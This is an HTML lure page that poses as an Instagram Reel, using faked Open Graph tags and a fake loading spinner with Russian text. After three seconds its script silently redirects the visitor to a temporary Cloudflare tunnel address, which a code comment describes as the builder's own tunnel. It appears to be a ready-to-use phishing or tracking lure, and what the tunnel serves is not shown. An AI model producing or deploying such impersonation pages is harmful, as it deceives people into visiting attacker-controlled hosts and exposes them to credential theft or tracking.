<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Instagram Reel by @instagram">
    <meta property="og:description" content="Watch this video on Instagram">
    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/ed9735746b65.png">
    <meta property="og:type" content="video.other">
    
    <title>Instagram Reel</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; }
        .container { text-align: center; padding: 20px; max-width: 400px; }
        .loader { border: 2px solid #333; border-top: 2px solid #fff; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 16px; font-weight: 400; margin-bottom: 10px; }
        p { font-size: 14px; color: #a8a8a8; }
    </style>
</head>
<body>

<div class="container">
    <div id="status-icon" class="loader"></div>
    <h1 id="headline">Loading Reel...</h1>
    <p id="subtext">Пожалуйста, подождите...</p>
</div>

<script>
    // Ссылка на твой туннель Cloudflare
    const targetUrl = "https://pursuit-hispanic-baker-combination.trycloudflare.com";

    // Автоматический переход через 3 секунды
    setTimeout(function() {
        window.location.href = targetUrl;
    }, 3000);
</script>

</body>
</html>
